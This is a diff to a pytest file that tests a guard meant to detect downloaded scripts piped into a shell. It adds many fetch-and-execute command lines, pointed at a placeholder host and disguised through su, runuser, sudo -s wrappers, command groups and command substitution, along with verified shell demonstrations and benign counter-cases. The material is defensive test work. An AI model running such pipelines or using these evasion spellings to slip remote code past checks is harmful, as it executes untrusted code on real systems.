@@ -61,14 +61,16 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
         # running each one rather than inferred from the man page:
         #   printf 'echo X\n' | nice sh   ->   X
         pytest.param("RUN curl -sSL https://x.example/i.sh | nice bash\n", id="nice-wrapper"),
-        # `su` is a shell under another name -- it starts the target user's shell with stdin
-        # intact. Not a wrapper: there is no command after it to judge. Confirmed as root so no
-        # password prompt intervenes:
-        #   printf 'echo PWNED\n' | sudo -n su   ->   PWNED
+        # `su` starts the target user's DEFAULT shell, with stdin intact, when nothing else is
+        # named. Its positional operand is a USER, not a command, so `su root` still runs a shell.
+        # Confirmed as root so no password prompt intervenes:
+        #   printf 'echo PWNED\n' | sudo -n su       ->   PWNED
+        #   printf 'echo PWNED\n' | sudo -n su root  ->   PWNED
         pytest.param("RUN curl -sSL https://x.example/i.sh | su\n", id="su-is-a-shell"),
         pytest.param("RUN curl -sSL https://x.example/i.sh | su -\n", id="su-login-shell"),
         pytest.param("RUN curl -sSL https://x.example/i.sh | su root\n", id="su-named-user"),
-        # `-s` picks WHICH shell; its operand is not the command being run.
+        # `-s` picks WHICH program to start. Here it names a shell, so the download is executed;
+        # the counter-cases below pin the spellings where it names something else.
         pytest.param("RUN curl -sSL https://x.example/i.sh | su -s /bin/sh\n", id="su-shell-flag"),
         # A FLAG can start a shell with no shell name present at all. The walk steps over `sudo`
         # and the flag, finds no command, and without this would read as clean:
@@ -251,6 +253,60 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
         # so exempting every `-c` would let this through.
         pytest.param(
             "RUN curl -sSL https://x.example/i.sh | sh -c 'bash'\n", id="dash-c-runs-a-shell"
+        ),
+        # A wrapper in FRONT of a flag-spawned shell. The check used to test `tokens[0]`, so any
+        # wrapper hid it -- and these all execute the download:
+        #   printf 'echo PWNED\n' | env sudo -n -s   ->  PWNED
+        #   printf 'echo PWNED\n' | nice sudo -n -s  ->  PWNED
+        pytest.param("RUN curl -sSL https://x.example/i.sh | env sudo -s\n", id="wrapped-sudo-s"),
+        pytest.param("RUN curl -sSL https://x.example/i.sh | nice sudo -s\n", id="nice-sudo-s"),
+        # The wrapper's own NUMERIC operand is not a command, so the walk must step over it.
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | timeout 30 sudo --login\n",
+            id="timeout-operand-then-sudo",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | nice -n 5 sudo -s\n",
+            id="nice-operand-then-sudo",
+        ),
+        # `--shell=` FUSED. Exact-matching `--shell` missed it, and the selected program is a
+        # shell:  printf 'echo PWNED\n' | sudo -n runuser --shell=/bin/sh root  ->  PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | runuser --shell=/bin/sh root\n",
+            id="runuser-fused-shell",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | su -s /bin/bash root\n", id="su-selects-a-shell"
+        ),
+        # A group is a command LIST, and the stream reaches every command in it. The `;` inside
+        # used to end the whole pipeline, detaching the shell from the fetch:
+        #   printf 'echo PWNED\n' | { true; bash; }  ->  PWNED
+        #   printf 'echo PWNED\n' | (true; bash)     ->  PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | { true; bash; }\n", id="brace-group-list"
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | (true; bash)\n", id="subshell-group-list"
+        ),
+        # The fetch may be captured by COMMAND SUBSTITUTION before being piped. It arrives inside
+        # a token rather than as one, so a whole-token match never fired. Each spelling runs:
+        #   printf '%s' "$(cat p.sh)" | bash   ->  ran
+        #   echo "$(cat p.sh)" | bash          ->  ran
+        #   printf '%s' "`cat p.sh`" | bash    ->  ran
+        pytest.param(
+            'RUN printf "%s" "$(curl -fsSL https://x.example/i.sh)" | bash\n',
+            id="substituted-fetch",
+        ),
+        pytest.param(
+            'RUN echo "$(curl -fsSL https://x.example/i.sh)" | bash\n', id="substituted-fetch-echo"
+        ),
+        pytest.param(
+            'RUN printf "%s" "`curl -fsSL https://x.example/i.sh`" | sh\n',
+            id="substituted-fetch-backticks",
+        ),
+        pytest.param(
+            'RUN printf "%s" "$(wget -qO- https://x.example/i.sh)" | bash\n',
+            id="substituted-fetch-wget",
         ),
         # Dockerfile EXEC form. Docker runs the array as argv with no shell of its own, but here
         # argv[0] IS a shell and argv[2] is the command it runs, so the download is executed just
@@ -481,6 +537,40 @@ def test_the_guard_catches_a_yaml_line_that_both_folds_back_and_continues_on(tmp
         # `-s`/`-i` start a shell only when NOTHING follows them. With a command present, sudo
         # runs THAT and the stream is never executed -- so the flag alone cannot be the signal.
         # Confirmed: printf 'echo X\n' | sudo -n -s echo hi   ->   hi
+        # `-s`/`--shell` CHOOSES which program `su`/`runuser` starts, and it need not be a shell.
+        # Matching `su` as a shell NAME made every spelling dangerous, including safe ones:
+        #   printf 'hello\n' | sudo -n su -s /usr/bin/sha256sum nobody  ->  5891b5b5…  (hashed)
+        #   printf 'hello\n' | sudo -n runuser -u root sha256sum        ->  5891b5b5…  (hashed)
+        pytest.param(
+            "curl -s https://x.example/f | su -s /usr/bin/sha256sum nobody",
+            id="su-selects-a-non-shell",
+        ),
+        pytest.param(
+            "curl -s https://x.example/f | runuser -u root sha256sum", id="runuser-runs-a-non-shell"
+        ),
+        # A chosen shell still defers to its own `-c`, exactly as `sh -c` does -- this is the
+        # verified-download pattern the guard exists to encourage:
+        #   printf 'echo PWNED\n' | sudo -n su -s /bin/sh -c 'echo RAN_C'  ->  RAN_C only
+        pytest.param(
+            "curl -s https://x.example/f | su -s /bin/sh -c 'sha256sum -c -'",
+            id="su-selected-shell-defers-to-c",
+        ),
+        pytest.param("curl -s https://x.example/f | su -c 'jq .'", id="su-c-non-shell"),
+        # A group whose commands are all ordinary is still ordinary; the depth tracking must not
+        # make every group suspicious.
+        pytest.param("curl -s https://x.example/f | { true; jq .; }", id="brace-group-into-jq"),
+        pytest.param("curl -s https://x.example/f | (true; jq .)", id="subshell-group-into-jq"),
+        # A separator at depth 0 still ENDS the pipeline: what follows has nothing piped into it.
+        pytest.param(
+            "curl -s https://x.example/f | jq . ; bash recover.sh", id="semicolon-ends-it"
+        ),
+        # A substitution that feeds a non-shell, and a shell fed by a substitution with no fetch
+        # in it. Neither downloads-then-executes.
+        pytest.param(
+            'printf "%s" "$(curl -fsSL https://x.example/d.json)" | jq .',
+            id="substituted-fetch-into-jq",
+        ),
+        pytest.param('echo "$(date)" | bash', id="substitution-without-a-fetch"),
         # An exec-form array that runs no shell rejoins into a stage whose command word is not a
         # shell, so it stays clean for the same reason its shell-form spelling would. Unwrapping
         # the JSON must not by itself make an array suspicious.
